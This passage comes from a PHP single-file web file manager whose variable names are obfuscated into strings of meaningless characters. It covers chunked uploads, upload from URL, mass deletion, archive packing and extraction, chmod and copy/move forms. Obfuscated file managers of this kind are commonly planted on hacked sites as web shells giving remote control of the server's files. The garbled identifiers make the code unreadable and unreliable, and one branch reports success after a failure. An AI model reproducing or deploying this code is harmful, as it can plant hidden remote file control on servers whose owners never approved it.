        $γγο™²γγ¬γγγ²„†Όγ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $γγγ‚γγγ†‰γγ¦;
        $γ»ογγ†‚«†γγγ = substr($γγο™²γγ¬γγγ²„†Όγ, 0, strrpos($γγο™²γγ¬γγγ²„†Όγ, "/"));

        if (!is_dir($γ»ογγ†‚«†γγγ)) {
            $γ―Όγγ‚«“™¦µ‰γγ = umask(0);
            mkdir($γ»ογγ†‚«†γγγ, 0777, true);
            umask($γ―Όγγ‚«“™¦µ‰γγ);
        }

        if (empty($ογ‚γγµγογογΌγ»['file']['error']) && !empty($Ώγ†γ¬γογγγΌγγ‚γο) && $Ώγ†γ¬γογγγΌγγ‚γο != 'none' && $ο•γγογΌγγγγγ‚ο) {
            if ($‚Όγγγ‰µ‚γ„γγ) {
                $γγ‚ογ‚γο“γΌογγ = @fopen("{$γγο™²γγ¬γγγ²„†Όγ}.part", $γγ²‚γ»γ‰γγ™γ‰ == 0 ? "wb" : "ab");
                if ($γγ‚ογ‚γο“γΌογγ) {
                    $²γγγο‚Ώγ†γΌγ­ = @fopen($Ώγ†γ¬γογγγΌγγ‚γο, "rb");
                    if ($²γγγο‚Ώγ†γΌγ­) {
                        if (PHP_VERSION_ID < 80009) {
                            // workaround https://bugs.php.net/bug.php?id=81145
                            do {
                                for (;;) {
                                    $»γγ†‰γγγγοΎγ = fread($²γγγο‚Ώγ†γΌγ­, 4096);
                                    if ($»γγ†‰γγγγοΎγ === false || $»γγ†‰γγγγοΎγ === '') {
                                        break;
                                    }
                                    fwrite($γγ‚ογ‚γο“γΌογγ, $»γγ†‰γγγγοΎγ);
                                }
                            } while (!feof($²γγγο‚Ώγ†γΌγ­));
                        } else {
                            stream_copy_to_stream($²γγγο‚Ώγ†γΌγ­, $γγ‚ογ‚γο“γΌογγ);
                        }
                        $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
                            'status'    => 'success',
                            'info' => "file upload successful"
                        );
                    } else {
                        $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
                            'status'    => 'error',
                            'info' => "failed to open output stream",
                            'errorDetails' => error_get_last()
                        );
                    }
                    @fclose($²γγγο‚Ώγ†γΌγ­);
                    @fclose($γγ‚ογ‚γο“γΌογγ);
                    @unlink($Ώγ†γ¬γογγγΌγγ‚γο);

                    $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
                        'status'    => 'error',
                        'info' => "failed to open output stream"
                    );
                }

                if ($γγ²‚γ»γ‰γγ™γ‰ == $‚Όγγγ‰µ‚γ„γγ - 1) {
                    if (file_exists($γγο™²γγ¬γγγ²„†Όγ)) {
                        $γγγγγ²²„²γ‚γ = $γγγ‚‚‚γ«‚γ‰‰Όγο ? '.' . $γγγ‚‚‚γ«‚γ‰‰Όγο : '';
                        $ογΌγ•Όγγ²γγο²‰γ»γ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . basename($γγγ‚γγγ†‰γγ¦, $γγγγγ²²„²γ‚γ) . '_' . date('ymdHis') . $γγγγγ²²„²γ‚γ;
                    } else {
                        $ογΌγ•Όγγ²γγο²‰γ»γ = $γγο™²γγ¬γγγ²„†Όγ;
                    }
                    rename("{$γγο™²γγ¬γγγ²„†Όγ}.part", $ογΌγ•Όγγ²γγο²‰γ»γ);
                }
            } else if (move_uploaded_file($Ώγ†γ¬γογγγΌγγ‚γο, $γγο™²γγ¬γγγ²„†Όγ)) {
                // Be sure that the file has been uploaded
                if (file_exists($γγο™²γγ¬γγγ²„†Όγ)) {
                    $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
                        'status' => 'error',
                        'info'   => 'Couldn\'t upload the requested file.'
                    );
                }
            } else {
                $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
                    'status'    => 'error',
                    'info'      => "Error while uploading files. Uploaded files $γ‚‰ογγΌ«γγ―οο",
                );
            }
        }
    } else {
        $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
            'status' => 'error',
            'info'   => 'The specified folder for upload isn\'t writeable.'
        );
    }
    // Return the response
    echo json_encode($‚γγγ‰Ό‚ογ—‚†γΌΎ);
    exit();
}

// Mass deleting
if (isset($_POST['group'], $_POST['delete'], $_POST['token']) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }

    $Ό†γΎ—γγγΌγ²Έο = 0;
    $ο‚γΌγγγ»‚γ‰Όγ‚ = $_POST['file'];
    if (is_array($ο‚γΌγγγ»‚γ‰Όγ‚) && count($ο‚γΌγγγ»‚γ‰Όγ‚)) {
        foreach ($ο‚γΌγγγ»‚γ‰Όγ‚ as $ογ‚γγµγογογΌγ») {
            if ($ογ‚γγµγογογΌγ» != '') {
                $²Όγ²Όγγγγ‚† = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»;
                if (!fm_rdelete($²Όγ²Όγγγγ‚†)) {
                    $Ό†γΎ—γγγΌγ²Έο++;
                }
            }
        }
        if ($Ό†γΎ—γγγΌγ²Έο == 0) {
            fm_set_msg(lng('Selected files and folder deleted'));
        } else {
            fm_set_msg(lng('Error while deleting items'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Pack files zip, tar
if (isset($_POST['group'], $_POST['token']) && (isset($_POST['zip']) || isset($_POST['tar'])) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    $γγγ‚‚‚γ«‚γ‰‰Όγο = 'zip';
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }

    //set pack type
    $γγγ‚‚‚γ«‚γ‰‰Όγο = isset($_POST['tar']) ? 'tar' : 'zip';

    if (($γγγ‚‚‚γ«‚γ‰‰Όγο == "zip" && !class_exists('ZipArchive')) || ($γγγ‚‚‚γ«‚γ‰‰Όγο == "tar" && !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }

    $ο‚γΌγγγ»‚γ‰Όγ‚ = $_POST['file'];
    $‚Όο‚ογγΈγΎ²γ¦ = array();

    // clean path
    foreach ($ο‚γΌγγγ»‚γ‰Όγ‚ as $γ»γγµ™„‚‚γ) {
        array_push($‚Όο‚ογγΈγΎ²γ¦, fm_clean_path($γ»γγµ™„‚‚γ));
    }

    $ο‚γΌγγγ»‚γ‰Όγ‚ = $‚Όο‚ογγΈγΎ²γ¦;

    if (!empty($ο‚γΌγγγ»‚γ‰Όγ‚)) {
        chdir($γΌγ‚²γγοΌΌγ„²«„);

        if (count($ο‚γΌγγγ»‚γ‰Όγ‚) == 1) {
            $ΌΏγ‚γγ‰†‚γ‚Όγγγ = reset($ο‚γΌγγγ»‚γ‰Όγ‚);
            $ΌΏγ‚γγ‰†‚γ‚Όγγγ = basename($ΌΏγ‚γγ‰†‚γ‚Όγγγ);
            $γ‚ογ‰Όγ²γΏγο‚γ = $ΌΏγ‚γγ‰†‚γ‚Όγγγ . '_' . date('ymd_His') . '.' . $γγγ‚‚‚γ«‚γ‰‰Όγο;
        } else {
            $γ‚ογ‰Όγ²γΏγο‚γ = 'archive_' . date('ymd_His') . '.' . $γγγ‚‚‚γ«‚γ‰‰Όγο;
        }

        if ($γγγ‚‚‚γ«‚γ‰‰Όγο == 'zip') {
            $‚«γγγ‰‚Ύο†γγγ‰οο = new FM_Zipper();
            $Όγγο»γΌ‰•ΌΌ™‚ = $‚«γγγ‰‚Ύο†γγγ‰οο->create($γ‚ογ‰Όγ²γΏγο‚γ, $ο‚γΌγγγ»‚γ‰Όγ‚);
        } elseif ($γγγ‚‚‚γ«‚γ‰‰Όγο == 'tar') {
            $γγΌ•‰²™γ²γ†ΌΈ = new FM_Zipper_Tar();
            $Όγγο»γΌ‰•ΌΌ™‚ = $γγΌ•‰²™γ²γ†ΌΈ->create($γ‚ογ‰Όγ²γΏγο‚γ, $ο‚γΌγγγ»‚γ‰Όγ‚);
        }

        if ($Όγγο»γΌ‰•ΌΌ™‚) {
            fm_set_msg(sprintf(lng('Archive') . ' <b>%s</b> ' . lng('Created'), fm_enc($γ‚ογ‰Όγ²γΏγο‚γ)));
        } else {
            fm_set_msg(lng('Archive not created'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Unpack zip, tar
if (isset($_POST['unzip'], $_POST['token']) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $‰ογγγγ»γ«γ¦ΏγΎ = urldecode($_POST['unzip']);
    $‰ογγγγ»γ«γ¦ΏγΎ = fm_clean_path($‰ογγγγ»γ«γ¦ΏγΎ);
    $‰ογγγγ»γ«γ¦ΏγΎ = str_replace('/', '', $‰ογγγγ»γ«γ¦ΏγΎ);
    $‚‚‰ο‰γ‚‹οΈογοΏγ = false;

    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }

    if ($‰ογγγγ»γ«γ¦ΏγΎ != '' && is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $‰ογγγγ»γ«γ¦ΏγΎ)) {
        $†γγ―γ»γγΏ™γγγγ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $‰ογγγγ»γ«γ¦ΏγΎ;
        $γγγ‚‚‚γ«‚γ‰‰Όγο = pathinfo($†γγ―γ»γγΏ™γγγγ, PATHINFO_EXTENSION);
        $‚‚‰ο‰γ‚‹οΈογοΏγ = true;
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }

    if (($γγγ‚‚‚γ«‚γ‰‰Όγο == "zip" && !class_exists('ZipArchive')) || ($γγγ‚‚‚γ«‚γ‰‰Όγο == "tar" && !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }

    if ($‚‚‰ο‰γ‚‹οΈογοΏγ) {
        //to folder
        $γγ†‚Ό‚‚γ„γ‰‰ = '';
        if (isset($_POST['tofolder'])) {
            $γγ†‚Ό‚‚γ„γ‰‰ = pathinfo($†γγ―γ»γγΏ™γγγγ, PATHINFO_FILENAME);
            if (fm_mkdir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γγ†‚Ό‚‚γ„γ‰‰, true)) {
                $γΌγ‚²γγοΌΌγ„²«„ .= '/' . $γγ†‚Ό‚‚γ„γ‰‰;
            }
        }

        if ($γγγ‚‚‚γ«‚γ‰‰Όγο == "zip") {
            $‚«γγγ‰‚Ύο†γγγ‰οο = new FM_Zipper();
            $Όγγο»γΌ‰•ΌΌ™‚ = $‚«γγγ‰‚Ύο†γγγ‰οο->unzip($†γγ―γ»γγΏ™γγγγ, $γΌγ‚²γγοΌΌγ„²«„);
        } elseif ($γγγ‚‚‚γ«‚γ‰‰Όγο == "tar") {
            try {
                $γγµ‰†γΌ»¦­‰γΌγγ = new PharData($†γγ―γ»γγΏ™γγγγ);
                if (@$γγµ‰†γΌ»¦­‰γΌγγ->extractTo($γΌγ‚²γγοΌΌγ„²«„, null, true)) {
                    $Όγγο»γΌ‰•ΌΌ™‚ = true;
                } else {
                    $Όγγο»γΌ‰•ΌΌ™‚ = false;
                }
            } catch (Exception $γγγΌΌ†ογ‚γγ) {
                //TODO:: need to handle the error
                $Όγγο»γΌ‰•ΌΌ™‚ = true;
            }
        }

        if ($Όγγο»γΌ‰•ΌΌ™‚) {
            fm_set_msg(lng('Archive unpacked'));
        } else {
            fm_set_msg(lng('Archive not unpacked'), 'error');
        }
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }
    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Change Perms (not for Windows)
if (isset($_POST['chmod'], $_POST['token']) && !FM_READONLY && !FM_IS_WIN) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }

    $γ»γγµ™„‚‚γ = $_POST['chmod'];
    $γ»γγµ™„‚‚γ = fm_clean_path($γ»γγµ™„‚‚γ);
    $γ»γγµ™„‚‚γ = str_replace('/', '', $γ»γγµ™„‚‚γ);
    if ($γ»γγµ™„‚‚γ == '' || (!is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ) && !is_dir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ))) {
        fm_set_msg(lng('File not found'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }

    $ο»Ό†ΈΌΏγ‰ = 0;
    if (!empty($_POST['ur'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0400;
    }
    if (!empty($_POST['uw'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0200;
    }
    if (!empty($_POST['ux'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0100;
    }
    if (!empty($_POST['gr'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0040;
    }
    if (!empty($_POST['gw'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0020;
    }
    if (!empty($_POST['gx'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0010;
    }
    if (!empty($_POST['or'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0004;
    }
    if (!empty($_POST['ow'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0002;
    }
    if (!empty($_POST['ox'])) {
        $ο»Ό†ΈΌΏγ‰ |= 0001;
    }

    if (@chmod($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ, $ο»Ό†ΈΌΏγ‰)) {
        fm_set_msg(lng('Permissions changed'));
    } else {
        fm_set_msg(lng('Permissions not changed'), 'error');
    }

    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

/*************************** ACTIONS ***************************/

// get current path
$γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
if (FM_PATH != '') {
    $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
}

// check path
if (!is_dir($γΌγ‚²γγοΌΌγ„²«„)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get parent folder
$γ†‚γΌ«γγγγγ = fm_get_parent_path(FM_PATH);

$γγ‚“‰γ‚„‚™γγΏγ = is_readable($γΌγ‚²γγοΌΌγ„²«„) ? scandir($γΌγ‚²γγοΌΌγ„²«„) : array();
$γ“γΈγγ„γ‚γο­ = array();
$ο‚γΌγγγ»‚γ‰Όγ‚ = array();
$γγγΎγ„γγΈγΌ¬ = array_slice(explode("/", $γΌγ‚²γγοΌΌγ„²«„), -1)[0];
if (is_array($γγ‚“‰γ‚„‚™γγΏγ) && fm_is_exclude_items($γγγΎγ„γγΈγΌ¬)) {
    foreach ($γγ‚“‰γ‚„‚™γγΏγ as $γ»γγµ™„‚‚γ) {
        if ($γ»γγµ™„‚‚γ == '.' || $γ»γγµ™„‚‚γ == '..') {
            continue;
        }
        if (!FM_SHOW_HIDDEN && substr($γ»γγµ™„‚‚γ, 0, 1) === '.') {
            continue;
        }
        $²Όγ²Όγγγγ‚† = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ;
        if (@is_file($²Όγ²Όγγγγ‚†) && fm_is_exclude_items($γ»γγµ™„‚‚γ)) {
            $ο‚γΌγγγ»‚γ‰Όγ‚[] = $γ»γγµ™„‚‚γ;
        } elseif (@is_dir($²Όγ²Όγγγγ‚†) && $γ»γγµ™„‚‚γ != '.' && $γ»γγµ™„‚‚γ != '..' && fm_is_exclude_items($γ»γγµ™„‚‚γ)) {
            $γ“γΈγγ„γ‚γο­[] = $γ»γγµ™„‚‚γ;
        }
    }
}

if (!empty($ο‚γΌγγγ»‚γ‰Όγ‚)) {
    natcasesort($ο‚γΌγγγ»‚γ‰Όγ‚);
}
if (!empty($γ“γΈγγ„γ‚γο­)) {
    natcasesort($γ“γΈγγ„γ‚γο­);
}

// upload form
if (isset($_GET['upload']) && !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    //get the allowed file extensions
    function getUploadExt()
    {
        $γγγ‰ογ‰‰γγ‰γγ = explode(',', FM_UPLOAD_EXTENSION);
        if (FM_UPLOAD_EXTENSION && $γγγ‰ογ‰‰γγ‰γγ) {
            array_walk($γγγ‰ογ‰‰γγ‰γγ, function (&$Ό‚™γΈγ»γ―Όγ) {
                $Ό‚™γΈγ»γ―Όγ = ".$Ό‚™γΈγ»γ―Όγ";
            });
            return implode(',', $γγγ‰ογ‰‰γγ‰γγ);
        }
        return '';
    }
    ?>
    <?php 
print_external('css-dropzone'); ?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php 
echo lng('UploadingFiles') ?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php 
echo lng('Upload from URL') ?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php 
echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php 
echo lng('Back') ?></a>
                    <strong><?php 
echo lng('DestinationFolder') ?></strong>: <?php 
echo fm_enc(fm_convert_win(FM_PATH)) ?>
                </p>

                <form action="<?php 
echo htmlspecialchars(FM_SELF_URL) . '?p=' . fm_enc(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple />
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php 
echo lng('Upload') ?></button>
                        <div class="lds-facebook">
                            <div></div>
                            <div></div>
                            <div></div>
                        </div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php 
print_external('js-dropzone'); ?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php 
echo UPLOAD_CHUNK_SIZE; ?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php 
echo MAX_UPLOAD_SIZE; ?>",
            acceptedFiles: "<?php 
echo getUploadExt() ?>",
            init: function() {
                this.on("sending", function(file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function(res) {
                    try {
                        let _response = JSON.parse(res.xhr.response);

                        if (_response.status == "error") {
                            toast(_response.info);
                        }
                    } catch (e) {
                        toast("Error: Invalid JSON response");
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
<?php

    fm_show_footer();
    exit;
}

// copy form POST
if (isset($_POST['copy']) && !FM_READONLY) {
    $„“γ—»ο²„‰‰Ό»γγ‚ = isset($_POST['file']) ? $_POST['file'] : null;
    if (!is_array($„“γ—»ο²„‰‰Ό»γγ‚) || empty($„“γ—»ο²„‰‰Ό»γγ‚)) {
        fm_set_msg(lng('Nothing selected'), 'alert');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
?>
    <div class="path">
        <div class="card" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <div class="card-header">
                <h6><?php 
echo lng('Copying') ?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="finish" value="1">
                    <?php

                    foreach ($„“γ—»ο²„‰‰Ό»γγ‚ as $Ύ‚γγ‰™γγ‰γοΏγγ‰) {
                        echo '<input type="hidden" name="file[]" value="' . fm_enc($Ύ‚γγ‰™γγ‰γοΏγγ‰) . '">' . PHP_EOL;
                    }
                    ?>
                    <p class="break-word"><strong><?php 
echo lng('Files') ?></strong>: <b><?php 
echo implode('</b>, <b>', $„“γ—»ο²„‰‰Ό»γγ‚) ?></b></p>
                    <p class="break-word"><strong><?php 
echo lng('SourceFolder') ?></strong>: <?php 
echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?><br>
                        <label for="inp_copy_to"><strong><?php 
echo lng('DestinationFolder') ?></strong>:</label>
                        <?php 
echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input">
                        <label for="js-move-files" class="custom-control-label ms-2"><?php 
echo lng('Move') ?></label>
                    </p>
                    <p>
                        <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php 
echo lng('Cancel') ?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php 
echo lng('Copy') ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// copy form
if (isset($_GET['copy']) && !isset($_GET['finish']) && !FM_READONLY) {
    $γγ„‚Ώ™γ‰γγο¦ο―γ—† = $_GET['copy'];
    $γγ„‚Ώ™γ‰γγο¦ο―γ—† = fm_clean_path($γγ„‚Ώ™γ‰γγο¦ο―γ—†);
    if ($γγ„‚Ώ™γ‰γγο¦ο―γ—† == '' || !file_exists(FM_ROOT_PATH . '/' . $γγ„‚Ώ™γ‰γγο¦ο―γ—†)) {
        fm_set_msg(lng('File not found'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php 
echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . $γγ„‚Ώ™γ‰γγο¦ο―γ—†)) ?><br>
            <strong>Destination folder:</strong> <?php 
echo fm_enc(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?>
        </p>
        <p>
            <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;copy=<?php 
echo urlencode($γγ„‚Ώ™γ‰γγο¦ο―γ—†) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;copy=<?php 
echo urlencode($γγ„‚Ώ™γ‰γγο¦ο―γ—†) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php 
echo lng('Select folder') ?></i></p>
        <ul class="folders break-word">
            <?php

            if ($γ†‚γΌ«γγγγγ !== false) {
            ?>
                <li><a href="?p=<?php 
echo urlencode($γ†‚γΌ«γγγγγ) ?>&amp;copy=<?php 
echo urlencode($γγ„‚Ώ™γ‰γγο¦ο―γ—†) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
            <?php

            }
            foreach ($γ“γΈγγ„γ‚γο­ as $ογ‚γγµγογογΌγ») {
            ?>
                <li>
                    <a href="?p=<?php 
echo urlencode(trim(FM_PATH . '/' . $ογ‚γγµγογογΌγ», '/')) ?>&amp;copy=<?php 
echo urlencode($γγ„‚Ώ™γ‰γγο¦ο―γ—†) ?>"><i class="fa fa-folder-o"></i> <?php 
echo fm_convert_win($ογ‚γγµγογογΌγ») ?></a>
                </li>
            <?php

            }
            ?>
        </ul>
    </div>
<?php

    fm_show_footer();
    exit;
}

if (isset($_GET['settings']) && !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $γ™γ‚†™„Όγγ­†γΌγγ, $»γογογγ™γ²γ, $γγγ„γγ‰γγγ‚Όγ‚ογγΌ;
?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-cog"></i> <?php 
echo lng('Settings') ?></span>
                <a href="?p=<?php 
echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php 
echo lng('Cancel') ?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php 
echo lng('Language') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select" id="js-language" name="js-language">
                                <?php

                                function getSelected($γ„¦‹γγ‰Ό‚¦γΏΈ)
                                {
                                    global $»γογογγ™γ²γ;
                                    return ($»γογογγ™γ²γ == $γ„¦‹γγ‰Ό‚¦γΏΈ) ? 'selected' : '';
                                }
                                foreach ($γγγ„γγ‰γγγ‚Όγ‚ογγΌ as $Όγ„γΈ„γοµ‰Όγγ => $γΌ‚²ΎΏΈ‚γ„•ογΌγ) {
                                    echo "<option value='$Όγ„γΈ„γοµ‰Όγγ' " . getSelected($Όγ„γΈ„γοµ‰Όγγ) . ">$γΌ‚²ΎΏΈ‚γ„•ογΌγ</option>";
                                }
                                ?>
                            </select>
                        </div>
                    </div>
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php 
echo lng('ErrorReporting') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php 
echo $“γ‚γ―γγο†‚»γγγγ ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php 
echo lng('ShowHiddenFiles') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php 
echo $»†„Ό‰—¬γΌΌ†γ††‰» ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php 
echo lng('HideColumns') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php 
echo $Όγγο“„γ²γΌ†γ†γγγγ ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
